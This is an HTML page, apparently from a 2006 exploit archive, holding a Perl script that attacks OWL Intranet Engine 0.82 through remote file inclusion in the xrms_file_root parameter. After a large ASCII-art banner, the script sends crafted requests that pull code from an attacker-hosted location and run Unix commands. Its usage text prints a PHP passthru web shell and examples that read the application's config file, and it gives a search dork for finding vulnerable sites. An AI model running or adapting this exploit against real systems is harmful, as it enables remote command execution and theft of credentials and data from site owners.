<html><head><title>OWL Intranet Engine 0.82 (xrms_file_root) Code Execution Exploit</title></head><pre>#!/usr/bin/perl
use IO::Socket;
print &quot;WwwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWwoLWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWw**wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWo°*òWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWwo° *òwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWò°  °°*òwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWwo°      °°*oòwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWWWWWWwò*°        °*òwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWWWWWWWWWWWWwò*°       °òWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWWWWWWWwwwLLwwwWWwo°      oWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWL*°              °*o°     °wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWW*     °*òwwwwwwò*             WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWo     °Lwwwwwwwwwwwwò           °WWWWWWwwwwwWWWWWWwwwwwwwwwwwwwWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWò     *wwwwwwwwwwwwwwww°          wWWWW*     *WWWWw             oWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWW°    °wwwwwò°   °*wwwwww          °WWWw       wWWW°      w      oWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWW     owwww*     °* owwww°          wWW*       °WWw      oW      oWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWW     °wwww       * °wwww           *Ww    o    wW*     *WW      oWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWo     owww°        owww°     o      w*   °W°   °w      wWW      oWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWW*     *wwwo°    °òwww°     oWo     °    wWL    °     òWWW      *wwwwwwwww\r\n&quot;;
print &quot;WWWWWWWWWWWWWL°     °òwwwwwwwwo°     *wWWW°        *WWW°        °WWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWwo°      °°°      °*LWWWWWWW        wWWWL       °WWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWWWWWwwwwLLLwwwwWWWWWWWWWWWWo      *WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW°     wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWw    *WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWo   wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW° *WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n&quot;;
print &quot;WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWw°WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n\r\n&quot;;
print &quot;  OWL Intranet Engine  0.82 \&quot;xrms_file_root\&quot; cmmnds xctn xploit\r\n&quot;;
print &quot;     -&gt; works with register_globals = On &amp; allow_url_fopen = On    \r\n&quot;;
print &quot;              by rgod rgod&lt;AT&gt;autistici&lt;DOT&gt;org                    \r\n&quot;;
print &quot;             site: http://retrogod.altervista.org              \r\n\r\n&quot;;
print &quot;Sun-Tzu: \&quot;But a kingdom that has once been destroyed can never come\r\n&quot;;
print &quot;again into being; nor can the dead ever be brought back to life\&quot;\r\n\r\n&quot;;
print &quot;\r\n dork: intitle:\&quot;owl intranet * owl\&quot; 0.82\r\n&quot;;
sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

$serv=$ARGV[0];
$path=$ARGV[1];
$loc=urlEncode($ARGV[2]);
$cmd=&quot;&quot;; for ($i=3; $i&lt;=$#ARGV; $i++) {$cmd.=&quot;%20&quot;.urlEncode($ARGV[$i]);};

if (@ARGV &lt; 4)
{
print &quot;\r\nUsage:\r\n&quot;;
print &quot;perl owl_082_xpl.pl SERVER PATH LOCATION COMMAND\r\n\r\n&quot;;
print &quot;SERVER         - Server where OWL is installed.\r\n&quot;;
print &quot;PATH           - Path to OWL (ex: /owl/ or just /) \r\n&quot;;
print &quot;LOCATION       - a site with the code to include (without ending slash)\r\n&quot;;
print &quot;COMMAND        - a Unix command\r\n\r\n&quot;;
print &quot;Example:\r\n&quot;;
print &quot;perl owl_xpl.pl localhost /owl/ http://192.168.1.3 ls -la\r\n&quot;;
print &quot;perl owl_xpl.pl localhost /owl/ http://192.168.1.3 cat ./../config/owl.php\r\n\r\n&quot;;
print &quot;note: on http location you need this code in /include-locations.inc/index.html :\r\n\r\n&quot;;

print &quot;&lt;?php\r\n&quot;;
print &quot;if (get_magic_quotes_gpc())\r\n&quot;;
print &quot;{\$_GET[\&quot;cmd\&quot;]=stripslashes(\$_GET[\&quot;cmd\&quot;]);}\r\n&quot;;
print &quot;ini_set(\&quot;max_execution_time\&quot;,0);\r\n&quot;;
print &quot;passthru(\$_GET[\&quot;cmd\&quot;]);\r\n&quot;;
print &quot;die;\r\n&quot;;
print &quot;?&gt;\r\n&quot;;
exit();
}
  $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;)
  or die &quot;[+] Connecting ... Could not connect to host.\n\n&quot;;
  print $sock &quot;GET &quot;.$path.&quot;lib/OWL_API.php?cmd=&quot;.$cmd.&quot;&amp;xrms_file_root=&quot;.$loc.&quot; HTTP/1.1\r\n&quot;;
  print $sock &quot;User-Agent: Y!TunnelPro\r\n&quot;;
  print $sock &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
  print $sock &quot;Connection: close\r\n\r\n&quot;;

  while ($answer = &lt;$sock&gt;) {
    print $answer;
  }
  close($sock);

# milw0rm.com [2006-03-07]</pre></html>